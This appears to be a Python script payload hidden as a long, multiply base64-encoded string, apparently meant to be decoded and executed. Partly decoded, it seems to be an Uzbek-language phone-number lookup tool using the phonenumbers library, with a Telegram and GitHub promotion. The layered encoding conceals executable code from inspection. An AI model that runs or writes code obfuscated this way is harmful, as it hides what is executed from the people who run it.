V0SlEwRm5TVU5CWjBsRFFXZEpRMEZuU1VOQlowbERRV2RKUjFZMFpFaEthRmt6VW14YVJqbDFaRmN4YVZwWVNucE1ibVI1WVZoU2JFdEliMmRMZVVGcFdFYzBhVXRSYjJkSlEwRm5TVU5CWjBsRFFXZEpRMEZuU1VOQlowbERRV2RhV0dnd1kyMUdhbVJIVm10WU1qVXhZbGRLYkdOdVRYVlpNbmgyWXpKVmIwdFJiMmRKUTBGblNVTkJaMGxEUVdkSlEwRm5TVU5CWjBsRFFXZGpTRXB3WW01UmIxSnRPWGxhVXpWSVZXdFdSbFJwUVhKSlEwcGpZbXg0ZFZoSE5XMVpXR3h6U1VoT2FHTlhlR2hpYlZKd1NVTkpaMHQ1UW5wWldGcHdZbTFrWmxwSGJIbGFWMDR3WWpOS05VbERjMmRKYVRVd1pVaFJhVXRSYjB0SlEwRm5TVU5CWjBsRFFXZEpRMEZMU1VOQlowbERRV2RKUTBGblNYbEJaMkZYV1dkaVIxWjFTMGh2Y0VsRFJUbEpSRUUyUTJkdlowbERRV2RKUTBGblNVTkJaMGxIYkcxSlIzaHNZbWxvZW1SSVNXOWFXR2d3WTIxR2FtUkhiSFZhZVd0d1NVUXdPVWxFUVRaRGFVRm5TVU5CWjBsRFFXZEpRMEZuU1VOQlowbElRbmxoVnpVd1MwVmFkbU50VlhWVmExWkZTVU56WjBsdVVteGlSMVp0WWpJMFoyTnRSbmhaVnpGMVlWTkNhbUZIYkhoWldFcHdXV2xDYVdJeWVIUlpWMUp3VEVOQ2FtRklWblZoTW10bldtMUdOV0pIVW1oSlNGSnNZa2RXYldJeU5HZGpiVVo0V1ZjeGMxbFlTbkJKU0ZKMlkwZHNjMkpYUm01WlZ6Um5aVmM1Y21GVFFqQmFWM2hzV20wNWRVbElTbWhqVjBaMFltMXJaMXBIUmpKaVIwWXdTVWQwZGxwSGEyZGpWemw2WVVkc2MySlhSbTVaVTBGcFMxRnZaMGxEUVdkSlEwRm5TVU5CWjBsSFZuTmhWMWxuV1RJNU1XSnVVbmxsVmpscVlqSlNiRWxITlhaa1EwSndZbWxCWjJNelVubExSMVkwWkVoS2FGa3pVbkJpYldOd1QyZHZaMGxEUVdkSlEwRm5TVU5CWjBsRFFXZEpRMEozWTIxc2RXUkRhRWRpTTBwc1RHeEtSbEpEUVhKSlEwcHJXVmhhYzFsWVVXZGpiVVo0V1ZjeGNHSnRhMmRaVnpWd1kxZDRhRmxwUW1saU1uaDBXVmRTY0VscGEwdEpRMEZuU1VOQlowbERRV2RKUTBGblNVTkJaMlJETlhwaVIxWnNZME5uZVV4cVVYQkRhVUZuU1VOQlowbERRV2RhVjNod1dtbENiV0ZYZUd4SlJEQTVTVVJKTmtOcFFXZEpRMEZuU1VOQlowbERRV2RKU0Vwc1dubEJPVWxEU1dsRGFVRm5TVU5CWjBsRFFXZEpRMEZuU1VoU2JHVklVV2RRVTBKd1ltNUNNV1JEYUVkaU0wcHNUR3RrVTFKVlZrOUpRM05uU1c1T2Rrb3pjSFZoVTBJMVlqTndjR0p0WXpaSlEwbG5TM2xDVkdSSWJITmFVelZUVWxaT1JsWkdPVUpVUlhkd1EybEJaMGxEUVdkSlEwRm5TVU5CWjBsSVFtOWlNalZzU1VRd1oyTkhhSFppYlZaMVpGY3hhVnBZU25wTWJFSnZZakkxYkZSdVZuUlpiVlo1VkZkR01Ga3lhR3hqYVdnd1dsaG9NRXhEUW5sYVYyTndRMmxCWjBsRFFXZEpRMEZuU1VOQlowbEhaSE5pTWtwb1lrTkNVV0ZIT1hWYVZUVXhZbGRLYkdOdVRVdEpRMEZuU1VOQlowbERRV2RKUTBGblZVZG9kbUp0Vms5a1Z6RnBXbGhLZWtsRU1HZEphVWxMU1VOQlowbERRV2RKUTBGblNVTkJaMk5JU25CaWJsRnZVbTA1ZVZwVE5VTlVSbFpHU1VOelowbHVUblpLTTNCeldWaEpaMkZYVG05aFYxSm9ZbWxDZG1KSGJIVmFSMnRuUzBjMWRtSlhWbmxMVTBGbldFYzFZMkpwU1hCRGFVRm5TVU5CWjBsRFFXZEpRMEZuU1VkYWRtTnBRbEZoUnpsMVdsVTFNV0pYU214amJrMW5ZVmMwWjJOSGFIWmliVlUyUTJsQlowbERRV2RKUTBGblNVTkJaMGxEUVdkSlEwRkxTVU5CWjBsRFFXZEpRMEZuU1VOQlowbERRV2RKU0VKNVlWYzFNRXRGV25aamJWVjFWMVZXVFZSRk9WaEpRM05uWXpOU2VVdEdRbTlpTWpWc1ZHNVdkRmx0Vm5samVXdHdTVUZ2WjBsRFFXZEpRMEZuU1VOQlowbERRbkJhYVVKeldsYzBiMk16VW5sTFJrSnZZakkxYkZSdVZuUlpiVlo1WTNscmNFbEVNRGxKUkVFMlEybEJaMGxEUVdkSlEwRm5TVU5CWjBsRFFXZEpRMEZuWTBoS2NHSnVVVzlTYlRsNVdsTTFVMUpWVVdkTGVVRnBXVEpvY0dOWFJubGhWMGxuV1cwNWMySlhSbXRoVTBsd1EybEJaMGxEUVdkSlEwRm5XbGQ0ZWxwVWIwdEpRMEZuU1VOQlowbERRV2RKUTBGblkwaEtjR0p1VVdkTFJWcDJZMjFWZFZWclZrVkpRM05uU1d0c2RXUnRSbk5oVjFGbllqTkNNR0ZYT1hWSmFXdExTVU5CWjBsRFFXZEpRMEZuU1VOQloyUkROWHBpUjFac1kwTkJiMDFwYTB0SlEwRm5TVU5CWjBsRFFXZEpRMEZuWWtjNWRtTkRaM0JEYVVGblNVTkNiR0pIYkcxSlJ6bDNaRWRzZG1KcFFUbFFVMEV3VDJkdlowbERRV2RKUTBGblNVTkNVV0ZIT1hWYVZUVXhZbGRLYkdOcFFUbEpSMngxWTBoV01FdEZXblpqYlZWMVVqRktSbEpWTkdkTGVVRnBaRWRXYzFwWFduWmlhVUo1V1ZoR2FHSlhOWEJKU0d4MlpXMXNkVnA1YUd0WldGcHpXVmhSWjJFeU9XdGhVMEpwWVZkNGFHSnBhemxRVkRSblNXbEJja2xHVGpCbFYzaHNUR3hLUmxVd1ZsVllNRVpOVkVOclMwbERRV2RKUTBGblNVTkJaMlJJU2pWUFoyOW5TVU5CWjBsRFFXZEpRMEZuU1VOQloyTkhSbmxqTWxWblVGTkNkMkZIT1hWYVZ6VXhZbGRLYkdOdVRYVmpSMFo1WXpKVmIxVkhhSFppYlZaUFpGY3hhVnBZU1hCRGFVRm5TVU5CWjBsRFFXZEpSMVkwV1RKV2QyUkViMHRKUTBGblNVTkJaMGxEUVdkSlEwRm5TVWhDZVdGWE5UQkxSVnAyWTIxVmRWVnJWa1ZKUTNOblNXMVNhR1J0ZUdoa1EwSnlZakpTY0dKdGEyZGxWemsyWVZjMWJrbFRTWEJEYVVGblNVTkJaMGxEUVdkSlEwRm5TVU5DTUV4dVRuTmFWMVozUzBSTmNFTnBRV2RKUTBGblNVTkJaMGxEUVdkSlEwSnpZakk1ZDB0RGEwdEpRMEZuU1VOQlowbERRV2RXYlVaellWZFNUMlJYTVdsYVdFbG5VRk5DZDJGSE9YVmFWelV4WWxkS2JHTnVUWFZoV0U1bVpHMUdjMkZYVW1aaWJsWjBXVzFXZVV0SVFtaGpiazVzUzFGdlowbERRV2RKUTBGblNVTkNjRnBwUWxkWlYzaHdXa1UxTVdKWFNteGphVUp3WTNsQ1ZXTnVWbXhQWjI5blNVTkJaMGxEUVdkSlEwRm5TVU5CWjJOSVNuQmlibEZ2VW0wNWVWcFROVWhWYTFaR1ZHbEJja2xHUW05aU1qVnNWRzVXZEZsdFZubEpRM05uU1dsQ2FXUlRRV2xKUTNOblVtMDVlVnBUTlVSWFZVWlBTVU56WjBsdVVteGhNMDV2WVZoS2NHSkhVbkJKYVd0TFNVTkJaMGxEUVdkSlEwRm5XbGQ0ZWxwVWIwdEpRMEZuU1VOQlowbERRV2RKUTBGblNVaENlV0ZYTlRCTFJWcDJZMjFWZFZJeFNrWlNWVFJuUzNsQ1VXRkhPWFZhVlRVeFlsZEtiR05wUVhKSlEwbG5XVzVWWjBscFFYSkpSVnAyWTIxVmRWVnJWa1ZKUTNOblNXNVNiR0V6VG05aFdFcHdZa2N4YUZwSGEybExVVzluU1VOQloxcFhlSEJhYVVKMlkwaFNjR0l5TkdkUVZEQm5UbFJ2UzBsRFFXZEpRMEZuU1VOQloySXpUWFZqTTJ4NlpFZFdkRXREU21waVIxWm9ZMmxKY0VOcFFXZEpRMEZuU1VOQlowbElRbmxoVnpVd1MwVmFkbU50VlhWU01VcEdVbFUwWjB0NVFXbFdWa0pGVVZaU1NsUnJZM1ZNYVRScFMxRnZaMGxEUVdkSlEwRm5TVU5DTUV4dVRuTmFWMVozUzBSSmNFTnBRV2RKUTBGblNVTkJaMGxIT1hwTWJrNDFZek5TYkdKVFoybEphVWxMU1VOQlowbERRV2RKUTBGblpWZEdkVm95YkhOWlZ6VnJZVk0wZFVscFNXbExVVzluU1VOQlowbERRV2RKUTBKM1kyMXNkV1JEYUVkaU0wcHNUR3RLVFZaVlZXZExlVUZwU1dsSlMwbERRV2RKUTBGblNVTkJaMlZYUm5WYU1teHpXVmMxYTJGVE5IVkRhVUZuU1VOQlowbERRV2RKUTBscFNXbHJTMGxEUVdkSlEwRm5TVU5CWjFwWWFIQmtRMmR3UTJsQlowbERRbXhpUjJ4dFNVYzVkMlJIYkhaaWFVRTVVRk5CTWs5bmIyZEpRMEZuU1VOQlowbElRbmxoVnpVd1MwVmFkbU50VlhWU01VcEdVbFUwWjB0NVFXbEphVWxMUTJkdlowbERRV2RKUTBGblNVTkJaMGxJUm5CYVIyeDVZVmQ0ZEdJelJtdFpVelIxVEdsSmFVbHBhMHRKUTBGblNVTkJaMGxEUWpCTWFVSjZZa2RXYkdORFozcExVVzluU1VOQlowbERRV2RKUnpsNlRHNU9OV016VW14aVUwRnZTVzFvTUdSSVFucFBhVGgyWkVNMWRGcFRPV2hpYldSc1l6TlNlV1JYTUdsTFVXOW5TVU5CWjFwWGVIQmFhVUoyWTBoU2NHSXlOR2RRVkRCblRucHZTMGxEUVdkSlEwRm5TVU5DZDJOdGJIVmtRMmhIWWpOS2JFeHNiRVpVUlhoUVZubEJja2xEU1dkYVIwWjZaRWhXZVdKdGEyZGhXRTV2WWtkR01Gb3lSblZoV0c5blpGZE9iMlJYTkdkamJVWTBZbGRHTUVsSFNuQmxiV1JvU1VjNWIyUlhOV2hKUjBwMllrZHNkVnA1U1hCRGFVRm5TVU5CWjBsRFFXZGlNMDExWXpOc2VtUkhWblJMUTBwdlpFaFNkMk42YjNaTU1tUndaRWRvTVZscE5XcGlNakIyVVZVMVNGSldUbFZWYkZaT1NXbHJTMGxEUVdkSlEwRm5TVU5DYkdWSGJEQkxRMnRMU1VOQlowbEhWbk5qTWxVMlEybEJaMGxEUVdkSlEwRm5ZMGhLY0dKdVVXOVNiVGw1V2xNMVUxSlZVV2RMZVVGcFltMDVNR0l5WkhsaFUwSnRaRmMxY21NeWJEVlpVMGx3UTJsQlowbERRV2RKUTBGblpFTTFlbUpIVm14alEyZDVTMUZ2WjBsRFFXZEpRMEZuU1VkNGRtSXpRVzlMVVc5blNVTkJaMk5JU25CaWJsRm5TME5KYVVsbmIwdEpRMEZuU1VOSmFVbHBhMHRKUTBGblNVZE9kbUp1VVdkUVUwSndZbTVDTVdSRGFFZGlNMHBzVEd4c1JsUkZlRkJXZVVGeVNVVkthRmt5YzNWVmExWkZTVU56WjBsdFVtaGtiVGwwU1VkV01HRllUbTlpYld0blpVYzViMkpIUmpWak1tdzJZbGRyTDFjeWFHaE1NMngyWTFZd05rbERTV2RMZVVKVVpFaHNjMXBUTlZOU1ZrNUdWa1k1UWxSRmQzQkRhVUZuU1VOQ2NGcHBRbXBpTWpVd1NVUXdPVWxEU2tsWlUwbG5Zak5KWjFreU9YVmtRMEU1VUZOQmFXRkhSV2xQWjI5blNVTkJaMGxEUVdkSlIzaDJZak5CYjB0UmNITmlNamwzUzBOclBRPT0"))